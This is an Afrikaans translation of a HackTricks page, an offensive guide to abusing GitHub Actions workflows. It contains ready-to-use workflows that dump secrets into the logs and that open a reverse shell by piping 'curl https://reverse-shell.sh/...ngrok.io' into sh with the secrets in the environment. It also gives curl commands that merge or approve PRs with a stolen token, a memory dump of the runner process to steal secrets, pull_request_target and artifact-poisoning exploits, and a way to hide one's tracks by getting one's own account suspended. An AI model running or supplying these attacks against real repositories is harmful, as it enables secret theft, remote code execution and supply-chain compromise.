# Misbruik van Github Actions

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**intekenplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basiese Inligting

Op hierdie bladsy sal jy vind:

* 'n **Opsomming van al die impakte** van 'n aanvaller wat toegang kry tot 'n Github Action
* Verskillende maniere om **toegang tot 'n aksie te kry**:
* Om **toestemmings** te h√™ om die aksie te skep
* Misbruik van **pull request** verwante snellers
* Misbruik van **ander eksterne toegang** tegnieke
* **Pivotering** vanaf 'n reeds gekompromitteerde repo
* Laastens, 'n afdeling oor **post-eksploitasie tegnieke om 'n aksie van binne te misbruik** (veroorsaak die genoemde impakte)

## Impakte Opsomming

Vir 'n inleiding oor [**Github Actions kyk na die basiese inligting**](../basic-github-information.md#github-actions).

In geval jy **arbit√™re Github aksies kan uitvoer/kode kan inspuit** in 'n **repository**, kan jy moontlik:

* **Steel** die **geheime** van daardie repo/organisasie.
* As jy net kan inspuit, kan jy steel wat reeds in die werkvloei teenwoordig is.
* Misbruik **repo voorregte** om toegang tot ander platforms soos AWS en GCP te kry.
* **Voer kode uit in pasgemaakte werkers** (as pasgemaakte werkers gebruik word) en probeer om daarvandaan te pivot.
* **Oorskryf** repository **kode**.
* Dit hang af van die voorregte van die `GITHUB_TOKEN` (indien enige).
* **Kompromitteer** **ontplooiings** en ander **artefakte**.
* As die kode iets ontplooi of stoor, kan jy dit verander en verdere toegang verkry.

## GITHUB\_TOKEN

Hierdie "**geheim**" (komende van `${{ secrets.GITHUB_TOKEN }}` en `${{ github.token }}`) word gegee wanneer die admin hierdie opsie aktiveer:

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

Hierdie token is dieselfde een wat 'n **Github Aansoek sal gebruik**, so dit kan toegang kry tot dieselfde eindpunte: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github behoort 'n [**vloei**](https://github.com/github/roadmap/issues/74) vry te stel wat **kruis-repository** toegang binne GitHub toelaat, sodat 'n repo toegang kan kry tot ander interne repos met behulp van die `GITHUB_TOKEN`.
{% endhint %}

Jy kan die moontlike **toestemmings** van hierdie token sien by: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Let daarop dat die token **verval nadat die taak voltooi is**.\
Hierdie tokens lyk so: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Sommige interessante dinge wat jy met hierdie token kan doen:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Approve PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Create PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Let daarop dat jy in verskeie gevalle **github-gebruikers tokens binne Github Actions omgewings of in die geheime** sal kan vind. Hierdie tokens mag jou meer voorregte oor die bewaarplek en organisasie gee.
{% endhint %}

<details>

<summary>Lys geheime in Github Action-uitset</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Kry omgekeerde dop met geheime sleutels</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Dit is moontlik om die toestemmings wat aan 'n Github Token gegee is in ander gebruikers se repositories na te gaan **deur die logs** van die aksies na te gaan:

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Toegestane Uitvoering

{% hint style="info" %}
Dit sou die maklikste manier wees om Github aksies te kompromitteer, aangesien hierdie geval veronderstel dat jy toegang het om **'n nuwe repo in die organisasie te skep**, of **skryf voorregte oor 'n repository** het.

As jy in hierdie scenario is, kan jy net die [Post Exploitation tegnieke](./#post-exploitation-techniques-from-inside-an-action) nagaan.
{% endhint %}

### Uitvoering vanaf Repo Skepping

In geval lede van 'n organisasie **nuwe repos kan skep** en jy github aksies kan uitvoer, kan jy **'n nuwe repo skep en die geheime wat op organisasie vlak gestel is, steel**.

### Uitvoering vanaf 'n Nuwe Tak

As jy **'n nuwe tak in 'n repository wat reeds 'n Github Aksie bevat** kan skep, kan jy dit **wysig**, die inhoud **oplaai**, en dan **daardie aksie vanaf die nuwe tak uitvoer**. Op hierdie manier kan jy **repository en organisasie vlak geheime eksfiltreer** (maar jy moet weet hoe hulle genoem word).

Jy kan die gewysigde aksie uitvoerbaar maak **manueel,** wanneer 'n **PR geskep word** of wanneer **sommige kode gestoot word** (afhangende van hoe raserig jy wil wees):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Geforkte Uitvoering

{% hint style="info" %}
Daar is verskillende snellers wat 'n aanvaller kan toelaat om 'n **Github Action van 'n ander repository uit te voer**. As daardie snellers swak gekonfigureer is, kan 'n aanvaller hulle kompromitteer.
{% endhint %}

### `pull_request`

Die werkvloeisneller **`pull_request`** sal die werkvloeie elke keer uitvoer wanneer 'n pull request ontvang word met 'n paar uitsonderings: standaard, as dit die **eerste keer** is wat jy **saamwerk**, sal 'n **onderhouer** die **uitvoering** van die werkvloeie moet **goedkeur**:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Aangesien die **standaard beperking** vir **eerste keer** bydraers is, kan jy bydra deur **'n geldige fout/taalfout reg te stel** en dan **ander PRs stuur om jou nuwe `pull_request` voorregte te misbruik**.

**Ek het dit getoets en dit werk nie**: ~~'n Ander opsie sou wees om 'n rekening te skep met die naam van iemand wat tot die projek bygedra het en sy rekening uitgevee het.~~
{% endhint %}

Boonop, voorkom dit standaard **skryftoestemmings** en **toegang tot geheime** na die teiken repository soos genoem in die [**dokumentasie**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Met die uitsondering van `GITHUB_TOKEN`, **word geheime nie aan die hardloper deurgegee** wanneer 'n werkvloeie van 'n **geforkte** repository gesneller word nie. Die **`GITHUB_TOKEN` het slegs-lees toestemmings** in pull requests **van geforkte repositories**.

'n Aanvaller kan die definisie van die Github Action verander om arbitr√™re dinge uit te voer en arbitr√™re aksies by te voeg. Hy sal egter nie geheime kan steel of die repo kan oorskryf nie as gevolg van die genoemde beperkings.

{% hint style="danger" %}
**Ja, as die aanvaller die github aksie verander in die PR wat gesneller sal word, sal sy Github Action die een wees wat gebruik word en nie die een van die oorspronklike repo nie!**
{% endhint %}

Aangesien die aanvaller ook die kode beheer wat uitgevoer word, selfs al is daar geen geheime of skryftoestemmings op die `GITHUB_TOKEN` nie, kan 'n aanvaller byvoorbeeld **kwaadwillige artefakte oplaai**.

### **`pull_request_target`**

Die werkvloeisneller **`pull_request_target`** het **skryftoestemming** tot die teiken repository en **toegang tot geheime** (en vra nie vir toestemming nie).

Let daarop dat die werkvloeisneller **`pull_request_target`** **in die basis konteks** loop en nie in die een wat deur die PR gegee word nie (om **nie onbetroubare kode uit te voer nie**). Vir meer inligting oor `pull_request_target` [**kyk die dokumentasie**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Boonop, vir meer inligting oor hierdie spesifieke gevaarlike gebruik, kyk hierdie [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Dit mag lyk asof omdat die **uitgevoerde werkvloeie** die een is wat in die **basis** gedefinieer is en **nie in die PR nie**, dit **veilig** is om **`pull_request_target`** te gebruik, maar daar is 'n **paar gevalle waar dit nie is nie**.

En hierdie een sal **toegang tot geheime** h√™.

### `workflow_run`

Die [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) sneller laat toe om 'n werkvloeie van 'n ander een te laat loop wanneer dit `voltooi`, `aangevra` of `in_progress` is.

In hierdie voorbeeld, is 'n werkvloeie gekonfigureer om te loop nadat die aparte "Run Tests" werkvloeie voltooi is:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Boonop, volgens die dokumentasie: Die werkvloei wat deur die `workflow_run` gebeurtenis begin word, kan **toegang tot geheime en skryftokens h√™, selfs al het die vorige werkvloei dit nie gehad nie**.

Hierdie soort werkvloei kan aangeval word as dit **afhanklik** is van 'n **werkvloei** wat deur 'n eksterne gebruiker via **`pull_request`** of **`pull_request_target`** geaktiveer kan word. 'n Paar kwesbare voorbeelde kan [**hier gevind word**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Die eerste een bestaan uit die **`workflow_run`** geaktiveerde werkvloei wat die aanvaller se kode aflaai: `${{ github.event.pull_request.head.sha }}`\
Die tweede een bestaan uit **die oordrag** van 'n **artefak** van die **onbetroubare** kode na die **`workflow_run`** werkvloei en die gebruik van die inhoud van hierdie artefak op 'n manier wat dit **kwesbaar vir RCE** maak.

### `workflow_call`

TODO

TODO: Kyk of wanneer dit vanaf 'n pull\_request uitgevoer word, die gebruikte/afgelaaide kode die een van die oorsprong of van die geforkte PR is

## Misbruik van Geforkte Uitvoering

Ons het al die maniere genoem waarop 'n eksterne aanvaller 'n github werkvloei kan laat uitvoer, nou gaan ons kyk hoe hierdie uitvoerings, as dit sleg gekonfigureer is, misbruik kan word:

### Onbetroubare checkout uitvoering

In die geval van **`pull_request`,** gaan die werkvloei in die **konteks van die PR** uitgevoer word (so dit sal die **kwaadwillige PR se kode** uitvoer), maar iemand moet dit **eers magtig** en dit sal met 'n paar [beperkings](./#pull\_request) loop.

In die geval van 'n werkvloei wat **`pull_request_target` of `workflow_run`** gebruik wat afhanklik is van 'n werkvloei wat vanaf **`pull_request_target` of `pull_request`** geaktiveer kan word, sal die kode van die oorspronklike repo uitgevoer word, so die **aanvaller kan nie die uitgevoerde kode beheer nie**.

{% hint style="danger" %}
Maar, as die **aksie** 'n **ekplisiete PR checkout** het wat die **kode van die PR** (en nie van basis af nie) sal kry, sal dit die aanvaller se beheerde kode gebruik. Byvoorbeeld (kyk na re√´l 12 waar die PR kode afgelaai word):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># ONVEILIG. Slegs as 'n voorbeeld verskaf.
on:
pull_request_target

jobs:
build:
name: Bou en toets
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Dankie!
</code></pre>

Die potensieel **onbetroubare kode word uitgevoer tydens `npm install` of `npm build`** aangesien die bou-skripte en verwysde **pakkette deur die skrywer van die PR beheer word**.

{% hint style="warning" %}
'n github dork om kwesbare aksies te soek is: `event.pull_request pull_request_target extension:yml` maar, daar is verskillende maniere om die werk te konfigureer om veilig uitgevoer te word, selfs al is die aksie onveilig gekonfigureer (soos die gebruik van voorwaardes oor wie die akteur is wat die PR genereer).
{% endhint %}

### Konteks Skrip Inspuitings <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Let daarop dat daar sekere [**github kontekste**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) is wie se waardes **deur die gebruiker** wat die PR skep **beheer word**. As die github aksie daardie **data gebruik om enigiets uit te voer**, kan dit lei tot **arbit√™re kode uitvoering:**

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV Skrip Inspuiting** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Van die dokumentasie: Jy kan 'n **omgewingsveranderlike beskikbaar maak vir enige daaropvolgende stappe** in 'n werkvloei werk deur die omgewingsveranderlike te definieer of op te dateer en dit na die **`GITHUB_ENV`** omgewingsl√™er te skryf.

As 'n aanvaller enige waarde binne hierdie **env** veranderlike kan **inspuit**, kan hy env veranderlikes inspuit wat kode in daaropvolgende stappe kan uitvoer soos **LD\_PRELOAD** of **NODE\_OPTIONS**.

Byvoorbeeld ([**hierdie**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) en [**hierdie**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), stel jou 'n werkvloei voor wat 'n opgelaaide artefak vertrou om sy inhoud binne die **`GITHUB_ENV`** env veranderlike te stoor. 'n Aanvaller kan iets soos hierdie oplaai om dit te kompromitteer:

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### Kwesbare Derdeparty Github Aksies

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Soos genoem in [**hierdie blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), laat hierdie Github Aksie toe om toegang tot artefakte van verskillende werkvloeie en selfs bewaarplekke te kry.

Die probleem is dat as die **`path`** parameter nie gestel is nie, die artefak in die huidige gids onttrek word en dit kan l√™ers oorskryf wat later gebruik of selfs uitgevoer kan word in die werkvloei. Daarom, as die Artefak kwesbaar is, kan 'n aanvaller dit misbruik om ander werkvloeie wat die Artefak vertrou, te kompromitteer.

Voorbeeld van 'n kwesbare werkvloei:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Dit kan met hierdie werkvloei aangeval word:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Ander Eksterne Toegang

### Verwyderde Namespace Repo Kaping

As 'n rekening sy naam verander, kan 'n ander gebruiker na 'n tyd 'n rekening met daardie naam registreer. As 'n repository **minder as 100 sterre gehad het voor die naamverandering**, sal Github die nuwe geregistreerde gebruiker met dieselfde naam toelaat om 'n **repository met dieselfde naam** as die een wat verwyder is, te skep.

{% hint style="danger" %}
So as 'n aksie 'n repo van 'n nie-bestaande rekening gebruik, is dit steeds moontlik dat 'n aanvaller daardie rekening kan skep en die aksie kan kompromitteer.
{% endhint %}

As ander repositories **afhanklikhede van hierdie gebruiker se repos gebruik**, sal 'n aanvaller hulle kan kaap. Hier is 'n meer volledige verduideliking: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Repo Pivotering

{% hint style="info" %}
In hierdie afdeling sal ons praat oor tegnieke wat toelaat om **van een repo na 'n ander te draai** veronderstel ons het een of ander vorm van toegang tot die eerste een (kyk die vorige afdeling).
{% endhint %}

### Cache Vergiftiging

'n Cache word onderhou tussen **workflow lopies in dieselfde tak**. Dit beteken dat as 'n aanvaller 'n **pakket** kompromitteer wat dan in die cache gestoor word en **afgelaai** en uitgevoer word deur 'n **meer bevoorregte** workflow, hy ook daardie workflow sal kan kompromitteer.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Artefak Vergiftiging

Workflows kan **artefakte van ander workflows en selfs repos gebruik**, as 'n aanvaller daarin slaag om die Github Action wat 'n **artefak oplaai** te kompromitteer wat later deur 'n ander workflow gebruik word, kan hy die ander workflows kompromitteer:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Post Eksploitasie vanaf 'n Aksie

### Toegang tot AWS en GCP via OIDC

Kyk na die volgende bladsye:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Toegang tot geheime <a href="#accessing-secrets" id="accessing-secrets"></a>

As jy inhoud in 'n skrip inspuit, is dit interessant om te weet hoe jy toegang tot geheime kan kry:

* As die geheim of token as 'n **omgewingsveranderlike** gestel is, kan dit direk deur die omgewing met **`printenv`** verkry word.

<details>

<summary>Lys geheime in Github Action-uitset</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Kry omgekeerde dop met geheime sleutels</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* As die geheim **direk in 'n uitdrukking** gebruik word, word die gegenereerde dopskrip **op skyf** gestoor en is toeganklik.
* ```bash
cat /home/runner/work/_temp/*
```
* Vir 'n JavaScript aksies word die geheime deur omgewingsveranderlikes gestuur
* ```bash
ps axe | grep node
```
* Vir 'n **pasgemaakte aksie**, kan die risiko wissel afhangende van hoe 'n program die geheim gebruik wat dit van die **argument** verkry het:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Misbruik van Self-hosted runners

Die manier om te vind watter **Github Actions op nie-github infrastruktuur uitgevoer word** is om te soek na **`runs-on: self-hosted`** in die Github Action konfigurasie yaml.

**Self-hosted** runners mag toegang h√™ tot **ekstra sensitiewe inligting**, tot ander **netwerkstelsels** (kwesbare eindpunte in die netwerk? metadata diens?) of, selfs al is dit ge√Øsoleer en vernietig, **meer as een aksie mag op dieselfde tyd uitgevoer word** en die kwaadwillige een kan **die geheime van die ander een steel**.

In self-hosted runners is dit ook moontlik om die **geheime van die \_Runner.Listener**\_\*\* proses\*\* te verkry wat al die geheime van die werkvloeie by enige stap sal bevat deur sy geheue te dump:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Kyk na [**hierdie pos vir meer inligting**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Register

Dit is moontlik om Github aksies te maak wat **'n Docker-beeld binne Github sal bou en stoor**.\
'n Voorbeeld kan gevind word in die volgende uitbreidbare:

<details>

<summary>Github Action Bou &#x26; Stoot Docker Beeld</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Soos jy in die vorige kode kon sien, word die Github-register gehost in **`ghcr.io`**.

'n Gebruiker met leesregte oor die repo sal dan in staat wees om die Docker Image af te laai met behulp van 'n persoonlike toegangstoken:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Dan kan die gebruiker soek na **gelekte geheime in die Docker-beeldlae:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Sensitiewe inligting in Github Actions logs

Selfs al probeer **Github** om **geheime waardes te bespeur** in die aksies logs en **vermy om dit te wys**, sal **ander sensitiewe data** wat gegenereer kon wees tydens die uitvoering van die aksie nie versteek word nie. Byvoorbeeld, 'n JWT wat met 'n geheime waarde onderteken is, sal nie versteek word nie, tensy dit [spesifiek gekonfigureer is](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Bedek jou spore

(Tegniek van [**hier**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Eerstens, enige PR wat ingedien word, is duidelik sigbaar vir die publiek op Github en vir die teiken GitHub-rekening. In GitHub kan ons **nie 'n PR van die internet verwyder nie** by verstek, maar daar is 'n kinkel. Vir Github-rekeninge wat **geskors** is deur Github, word al hul **PR's outomaties verwyder** en van die internet verwyder. Dus, om jou aktiwiteit te verberg, moet jy √≥f jou **GitHub-rekening laat skors √≥f jou rekening laat merk**. Dit sal **al jou aktiwiteite** op GitHub van die internet verberg (basies al jou uitbuit PR verwyder).

'n Organisasie in GitHub is baie proaktief in die rapporteer van rekeninge aan GitHub. Al wat jy hoef te doen is om ‚Äúiets‚Äù in 'n Issue te deel en hulle sal seker maak jou rekening word binne 12 uur geskors :p en daar het jy dit, jou uitbuiting onsigbaar gemaak op github.

{% hint style="warning" %}
Die enigste manier vir 'n organisasie om uit te vind dat hulle geteiken is, is om GitHub-logs van SIEM na te gaan, aangesien die PR van GitHub UI verwyder sou wees.
{% endhint %}

## Gereedskap

Die volgende gereedskap is nuttig om Github Action workflows te vind en selfs kwesbare te vind:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**intekenplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
